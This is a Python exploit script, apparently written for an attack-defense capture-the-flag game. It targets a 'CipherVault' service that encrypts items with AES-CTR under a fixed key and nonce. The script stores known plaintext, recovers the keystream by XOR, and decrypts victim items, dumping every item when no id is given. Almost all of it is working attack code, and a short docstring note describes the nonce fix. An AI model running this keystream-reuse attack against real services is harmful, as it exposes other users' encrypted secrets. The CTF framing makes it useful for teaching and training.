"""Exploit for the CipherVault (crypto) service — AES-CTR keystream reuse.

Vulnerability: the service encrypts every item with AES-CTR under a KEY and a
NONCE both fixed once at process start (NONCE = b"\\x00"*8). AES-CTR is a stream
cipher, so identical (KEY, NONCE) means an identical keystream for every item —
the classic many-time-pad mistake. GET /api/item/<id> publicly returns the raw
ciphertext (and GET /api/items enumerates every id), with no token.

Attack: store our own known plaintext, read its ciphertext, recover the
keystream KS = P XOR C, then decrypt any target item C_flag XOR KS. flag_id is
the victim item id; if it is None we enumerate /api/items and dump everything.

Patch (defense): use a fresh random nonce per item and store it beside the
ciphertext (see services/crypto/solution.md). Distinct nonces ⇒ distinct
keystreams ⇒ recovery of one tells you nothing about another.

Interface: exploit(host, port, flag_id) -> list[str]   # flag_id = victim item id
Deps: requests.
"""
import re
import sys

import requests

FLAG_RE = re.compile(r"[A-Z0-9]{31}=")
TIMEOUT = 7
KNOWN = b"A" * 256                 # long enough to cover any 32-byte flag ciphertext

# Keystream is stable for a service process's lifetime -> cache per box; a service
# restart changes KEY, so we self-heal (drop + re-recover) if a decrypt yields nothing.
_KS = {}


def _recover_ks(base):
    try:
        r = requests.post(base + "/api/store",
                          json={"owner": "a", "secret": KNOWN.decode()}, timeout=TIMEOUT)
        known_id = r.json()["id"]
        r = requests.get(base + "/api/item/%s" % known_id, timeout=TIMEOUT)
        ct = bytes.fromhex(r.json()["ciphertext"])
    except Exception:
        return None
    return bytes(a ^ b for a, b in zip(KNOWN, ct))


def _decrypt(base, item_id, ks):
    try:
        r = requests.get(base + "/api/item/%s" % item_id, timeout=TIMEOUT)
        ct = bytes.fromhex(r.json()["ciphertext"])
    except Exception:
        return []
    pt = bytes(a ^ b for a, b in zip(ct, ks)).decode("utf-8", "ignore")
    return FLAG_RE.findall(pt)


def _targets(base, flag_id):
    if flag_id is not None:
        return [str(flag_id).strip()]
    # no id given -> enumerate and dump every item
    try:
        items = requests.get(base + "/api/items", timeout=TIMEOUT).json().get("items", [])
    except Exception:
        items = []
    return [str(it.get("id")) for it in items if isinstance(it, dict) and it.get("id")]


def exploit(host, port, flag_id):
    flags, seen = [], set()
    try:
        base = "http://%s:%s" % (host, port)      # %s: a non-int port returns [] instead of raising
        key = (host, port)
        from_cache = key in _KS
        ks = _KS.get(key) or _recover_ks(base)
        if not ks:
            return flags
        _KS[key] = ks

        # Try with the (possibly cached) keystream; if a cached one yields nothing it
        # may be stale (the target box restarted with a new KEY) -> re-recover once and
        # retry. Applies to BOTH the flag_id and the enumerate (flag_id=None) paths.
        for attempt in range(2):
            for tid in _targets(base, flag_id):
                for m in _decrypt(base, tid, ks):
                    if m not in seen:
                        seen.add(m)
                        flags.append(m)
            if flags or not from_cache or attempt == 1:
                break
            fresh = _recover_ks(base)
            if not fresh:
                break
            _KS[key] = ks = fresh
            from_cache = False
    except Exception:
        return flags
    return flags


if __name__ == "__main__":
    h = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    p = int(sys.argv[2]) if len(sys.argv) > 2 else 5002
    fid = sys.argv[3] if len(sys.argv) > 3 else None
    for f in exploit(h, p, fid):
        print(f)
